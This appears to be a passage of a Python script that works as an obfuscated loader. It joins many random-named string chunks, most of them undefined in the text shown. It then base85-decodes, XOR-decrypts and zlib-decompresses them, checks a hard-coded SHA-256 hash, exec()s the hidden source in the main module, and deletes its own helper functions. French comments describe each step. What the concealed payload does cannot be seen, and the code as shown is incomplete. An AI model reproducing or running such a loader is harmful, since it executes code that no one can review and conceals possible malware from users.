_cpTm7_DBPfI6Hz = '#()8JGcjQd4K8<}i)=UkxhD5i3G@0Sv0g78lJGIClbh9*Co417w58g$Q62*-?3JP1wK~I`sB6%^R'
_csCCocF3zFELe1 = '2`*Y~Hqp4<3PVw7l*b70u^)4`}*9FG-iuFyRscBP(X5Ts3LDTl;jj_B)iB6`z;sIydTt5wEb3sY('
_cvxc8kz42uO_W7 = '3GQYKq=zG4jERAkte@Ph$DBplnh%&*DcWO*-sujNo4pc23IBh09L4M?|@<aZ6NB9U^KMog3mEsvi'
_chKAI0DxLmQqND = 'pw)xXu~mxVajn63+c0t-bKaCudvNC?euq#TW-cL5=lppAL58ZFyQo)I;ty$~!UM`vM4a&N6Ki}fH'
_cbO3DAj5YyGtjU = 'zHN`Vf70db<(@ureUseri1fj!6N}Ct0RmS+<K8awn^G`^(+>qNGjo?#F1@~`khkvU7g`J&uE8-q~'
_ct4rEYIcuemNax = 'y(kX0$1N&i*iTy4N<(2&9##=MEf3F?w1o7S<~F|Ma<8Y-k%Us||M!+4gR<5~4SPwKjlkfMK}lm{v'
_cuWloFwZ37EcsW = 'U)j-|sAF9F}C_8(vkg^y%E{XAW4-T||UmDr^QQj8UWX>*ikO)u%a!)TTeTVv|YB$y(?kdNoi#Lc}'
_cxKknP62CAZcvA = 'r>RQcbGC@K0Fm0jv!+^?{@yuIo;}JsL=r@{Z8df3NeO)-B2_Qs6b&!L=c8CdRRYCkrE^Wvw0w<Th'
_cuwrGeqhhyFAz2 = 'i&LGM>WvgBRh+}Co1>_Bd6;87)8K)y(h25iZyOVvatB#n+r<S)abUq+9JMGVvAzymgB5`(kXOmto'
_cyPZHWHcr6RRgA = '#9#d@wjR*^7o{JI0|k;#9*DHm-&5F?JQSOJI3Bsf+VXQXP5sI(S*Fmj%=o-4&4(<^$_f#`NN(f__'
_cewuwA82_KErTh = 'f9<D_OryH-ckF!cWwl8lu4(=fr`z@3#QkRi`OLo5)RB`+u;H^~n9}oupZU7G1=*%IBWuMt3KJu^q'
_ct6D3imEG6I09U = '%|oq99Tq+j`!fv&xE*|l-xgsti+UK`2qa37&)59~=y3o7_W2A_i}M)fJqoy;X}Lw+vOn02m(4dw<'
_cfyfV8V731Jluf = 'ScK~Qw%gI@rz*ynJgt~zOI#TyVK)Bwl$PpG7U)EHq9Y<naO5WiO2anU$^*Hu0%7{JIRWh|LEs3J('
_cnUKopovkLRLxd = '9j6A3b`d{f-5=927JvEUCr0tZAebv-lW)Q;AezK{=|YNYO}C9!8QU4ZIewcvMBVPcJcVFh^<t$YR'
_cq3VYQXexBal_T = '^^A-rA7{d>r}rt54dQY`N2LyiLmBP(_^pLYYDeFQ)Ba5{$|h6N7Aep<G=0u#BO-Uc~s8_?*iKy^_'
_ctx9TaLSJ0HwkH = 'iO*>e8a@zubD_u=pM@Q}v(g|4ikJ@Y4Ol{ocKpq}v;Dv*ExHA!yy7-N%v|?=MPMa*BhT3Z=sPD?7'
_chqvXfxKtvgleQ = '!Ch9707!3ag9SsNig#QsLN5RI=JfgS4wUQ7uWS5r2{JbNepXqt-z8)ebS>IrS9&@>Vo7>}*7Jl{3'
_ccXwA717uZ20Eq = 'd_pefgpTYQE!jPv^pxD*cO+=ysC1>#`z!KV`fmWO@r7bk%3@qp}O&||hvN@JWLZVMBp<5OoiU=<i'
_cs51jF13fHrGjv = 'MbLfA#<3ulMSp7#@HS7^`xb}P>eCE`dHB2cmW6Ajj{`a7O`63aY%e{PFMA2VpO4mSdj}j{NCb*kg'
_cw8TP4b6IoEDeI = '5QK|zf-Vt;w9d2-UJLbwo)4x5bi1whqWdl3-lL1><bAPhabr+Xxuyz@hN&(2`knvhc@agD?HawHm'
_clIN14hjjYIhCe = 'VC}%bj{Hzz`1YCk9VDV0OPq3V!4fR`=_$OE1S$SHKhc5zM{SDLD8Ag$EelwBd}|#O;3Qrp{LZAMr'
_cd1uodaNfDfgFE = 'w#d~1?PDy%zeX}z|23tfB@bff0w91=}P^9K<s@Vo3dN|=K|%|TW<mar`#%I>i^`0B&VoW~t-L-f-'
_crJcbET2AWWFiS = 'g>myDRY|E-!QCg-`qhwGlIU=ay7Y|?SL`LuwBzEP}pA0MC-=vhaB!32W9O&{J^N|jM;Lh9VNzj<D'
_cfwEtojPfITqrb = 'IU)!o)2I%E;EgOhN>}2t3dC&mIPN({?u~LeZ8^3KG0YSuYyacED7+g-D!8v9Dx-_DmfWn18yU+qh'
_cnzcw5S9w7qqHo = '&9h+b5W(lpBc?soMUG8eP?Rh64M&`vG`!bH2iK!NxYPC_FQHjisM+uMv4XUsvQf40pR9IawYBpU$'
_caC12hdXjtg1qq = '3in_Kx!xCHkTxG8peSdC0DVqPSKBp^bSA3geRmw?OvmC@UIJ#{27_yEL>0xpBoo-kHakd!d~8_DD'
_ca2zjoHC0JdF9W = 'j<%kD1%G_tBh26`i>GceMua5!=XG+5HkEB`v~Ey}KJ$J}|FG%(*3<;(o9ZK>=!TPUcl28TS}aKO6'
_cs7JZEHsvkqaWa = 'n4KCEoHzMrFAgxZ)e3uwfw8)G)8jtvp2u0f|(wZbXt<cp6GJYhdp&gqiifccrb3XEW#R+ijDGD-j'
_craqVwhNqA1pnQ = '7VtEBI^<C3Ksb5u;Z_D&rxrNk%zeD);8NzGRH##o??XKIY@+x{73AnXr0$GkJARkwt2eHL_|5uXq'
_cr5RgPJCFCRpAH = 'vZM#Hh7d(e=aU?s(glpX`Aw+*d+nzGU`s|Sw@cuBGN8^&U(4q<{}XqJWSjg7!)F0X>2;irYO+M^r'
_cvNXY9UoHBlXYf = 'V*FD<Bo+u)Jh6BxXHD;Op?JS{^9X=6|Wp{O&~54j`jOH!WR}&MA}5{wMA`6X?0F|JoM+kKI@-bL{'
_cjoM5x2EOAAnzL = 'UV-3H_Tod}hPx_$^Dhd;x`Xe~NY%jlSO'

_psHOPPzAnl8GkC = __import__('base64').b85decode(_cjNkANotD3kmvF + _clucFE1t4vwrjr + _czVJwHDrRnEIqr + _clEc1gc93HNzpi + _cdIM7mKepDvaCO + _cqHYbcJTeVk0xA + _cnrl6EIXU_t6mh + _cwH8DoLGT9RTus + _cowTCWu0xtrVe1 + _coHpcK0YXgUFAL + _caNQ4fxkTE312o + _cab2bCvek1LiH_ + _clzh4OmcDgQFoh + _cesnHbKkTIyYRi + _clkdrvGfxvTdLW + _ctPJLjwIUujBUM + _cvp3lc0ZPcOyeH + _c_gzsYR93aYzUb + _csBivmx5V3JuD7 + _cxBFNn5FMk9Y10 + _cqaGI4_9uuwavE + _cf_2I53ucYpUD7 + _cdHVUU83aNpepq + _cspeBp5MidMbEp + _ctoj4IkiatnAoz + _ckGNWoy0FtspCu + _ckNYxdnSd_TR8K + _cei_9Ac203bH9C + _cnYvcvgWwrmAVK + _cwytReCo1faz0H + _caUqnRruN1M3yJ + _cmF37DjU4dYDWW + _csHRHyKMd1RZOR + _cnjdbZAAKsRmYM + _cnPvQQGlLSs4uy + _cl42cF0732592s + _coMiVCqnaUPagB + _cykZGg4qRR8YV5 + _cpapRYzN2RTS41 + _cvQnYeRn5AHhlx + _c_VoaX4u_SJU8v + _cc02oN4iEgnPto + _cfDZvzRKSATZ7Y + _ckEl4Q0BlUM4Fr + _cbrdBie1etpSoV + _ckPl5rlmcQqhGe + _cmWegdCo32ClI1 + _cxc9Acdemgg49V + _ccLzmuevpMBGuY + _cvzuWFVfsLbRvL + _coV6toCy4RYyHo + _csBgBqINR3LhF4 + _chQVLqPqecQZVY + _cv2ORT4Vp6ipm1 + _ct6Lj_kDle328A + _ccw_t2iKp0JG6E + _cdSt8F09_g_6Y3 + _ccnvW8caasUrjp + _cvWL_qoZskSipZ + _caIiq0yCNOHW3a + _cdRBu3hQUhPcW7 + _cwtICg7gI99t6F + _cru6TDmTzkNyL5 + _ckP37HEHg1uWIF + _ci9RFVSZNQXw91 + _ccQSRfro6NJu4L + _cbSbS4o5GVFAY9 + _cfM5fU9eQMiJBK + _czL3BczedZDUaH + _cjJtzl8qRZwDp6 + _cePz7LGVAH3apW + _cvTSaQezNuSp6A + _ctsycMBwVuwWCt + _cj2_Wa0dIAWl9k + _cj6qvwemzlow1e + _cmGuWcedPrfGKx + _chYwTslLe6LrQv + _cp8f42onSIGIpE + _c_yyGGErgNntyD + _cwAF2UdA4Lcsco + _ciWlthfoGfBhaQ + _csDMKnJK1GxUA9 + _cyHC9cDnm7ImUR + _cwOoRCbMqs5Vzh + _cwteJKypMy7v5X + _cddJ2EWutywJMh + _ccffHBWjXNK6OK + _cdWp9KPGRPLytu + _cyzWsIQtAXaXFo + _csVxqQuP_48KQ1 + _cqYw3GiUvNeA92 + _cgCk59poAJZ_MF + _cl1w7RB_s9L7v_ + _cjcceuBXWzt6L5 + _cic0PhWr1AC3nM + _cgRWuCu9PDddJx + _csichj5Z2lqmJr + _catX7B8mQuAC41 + _ciAhQ0TbCH5bTy + _crPTL9lOhP_mDV + _cgTnAt2uDaOQgV + _cjrgIui3xj0zRl + _cpOHYTWUNmHHxy + _cd_NWErGwn_Dtj + _cbttg6tNlPC5VO + _cyhLNtsbYbzhOk + _cpKwDGHIAWSp3z + _clDOUExyYjH0Pr + _cxsqsb9MisDdTe + _cscchL0os7i0TR + _caX2MOQOwCXILx + _cgNPoLtTd4JRJ9 + _cgbZWCm9rHGnkc + _cq8uOtLYGVSF68 + _cazeD_pVnMTlhr + _cielIzmqp7hITW + _cwELfcuKpXnUNS + _ckqJIMDjLxj3QH + _crOsqdeSQRnEs0 + _ciSwZPqJSwXIAp + _cjg5SP4kKaNk9T + _cjigjynRP0AUSZ + _cqfiIWOIsWrCUF + _ca1bFpRXdSEtvT + _clJqcftlR1LUEc + _ccTpg__daDBrhh + _cxc2nZ71w8FLWW + _cdnRojCX7BqxDe + _ct6cD8NMeKr7n6 + _cc7QNjN6Mrj2ph + _cj0V6XlBm8aweA + _cjD_RfAgR0n1LB + _cjW0ABTccZePeZ + _csCCvQMR08git_ + _cjboFlBezQATog + _ccWB9JyZYlG9nB + _cvwBYFIUqIS4wQ + _crpvJrNPkwHmRm + _cyqTOGWgREUA6g + _cjW2FhIBubv7GP + _cd6H9ssCeQGh8g + _cgob5BflnbsYpm + _cgfZNMwGH5mr5w + _cxgUXG3mFbhliL + _cbvjF71kAz3FJt + _cnzTTrvtefZWTE + _cpLo8fZAo3bY17 + _ct_Nh584FRAAxW + _ceyDbAGrAScwUz + _ci27G05ylTUGQX + _cgChDei9XA0Qnw + _chJRAHKCOzO2FV + _cpTm7_DBPfI6Hz + _csCCocF3zFELe1 + _cvxc8kz42uO_W7 + _chKAI0DxLmQqND + _cbO3DAj5YyGtjU + _ct4rEYIcuemNax + _cuWloFwZ37EcsW + _cxKknP62CAZcvA + _cuwrGeqhhyFAz2 + _cyPZHWHcr6RRgA + _cewuwA82_KErTh + _ct6D3imEG6I09U + _cfyfV8V731Jluf + _cnUKopovkLRLxd + _cq3VYQXexBal_T + _ctx9TaLSJ0HwkH + _chqvXfxKtvgleQ + _ccXwA717uZ20Eq + _cs51jF13fHrGjv + _cw8TP4b6IoEDeI + _clIN14hjjYIhCe + _cd1uodaNfDfgFE + _crJcbET2AWWFiS + _cfwEtojPfITqrb + _cnzcw5S9w7qqHo + _caC12hdXjtg1qq + _ca2zjoHC0JdF9W + _cs7JZEHsvkqaWa + _craqVwhNqA1pnQ + _cr5RgPJCFCRpAH + _cvNXY9UoHBlXYf + _cjoM5x2EOAAnzL)
if __import__('hashlib').sha256(_psHOPPzAnl8GkC).hexdigest() != 'd177bb8215badec4f29d3886ab5fddf56394b9ebbf5dea2913d84cdd66b3883b':
    __import__('sys').exit(1)
_xcKG_KZ4NDQL28 = bytes([25, 135, 211, 197, 83, 17, 215, 45, 249, 128, 220])
_fkdYQjGLwZaY6CN = bytes([114, 10, 78, 51, 21, 111, 142, 167, 184, 34, 173])

def _fxdgY2NKUWM9e_K(_blFGfaW9w2Jphv, _kwebfiX5iSexfP):
    return bytes(_blFGfaW9w2Jphv[_isx9hF_nRGhzyP] ^ _kwebfiX5iSexfP[_isx9hF_nRGhzyP % len(_kwebfiX5iSexfP)] for _isx9hF_nRGhzyP in range(len(_blFGfaW9w2Jphv)))

def _fdvRXSgjm_P0y6G(_ttk7mSgzwQ31zC):
    import zlib
    return zlib.decompress(_ttk7mSgzwQ31zC) # Un seul niveau de zlib ici pour simplifier

def _fehIWChPL24uT20():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xfUSgyXiR0jlHP = _fxdgY2NKUWM9e_K(_psHOPPzAnl8GkC, _xcKG_KZ4NDQL28)
    # 2. Décompression Zlib
    _deowVEsEXEAYsE = _fdvRXSgjm_P0y6G(_xfUSgyXiR0jlHP)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _deowVEsEXEAYsE.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nis95DJNuzDuR1 = _main.__dict__
    _nis95DJNuzDuR1.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nis95DJNuzDuR1)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fehIWChPL24uT20()
try:
    del _fxdgY2NKUWM9e_K, _fdvRXSgjm_P0y6G, _fehIWChPL24uT20
    del _psHOPPzAnl8GkC, _xcKG_KZ4NDQL28, _fkdYQjGLwZaY6CN
except:
    pass
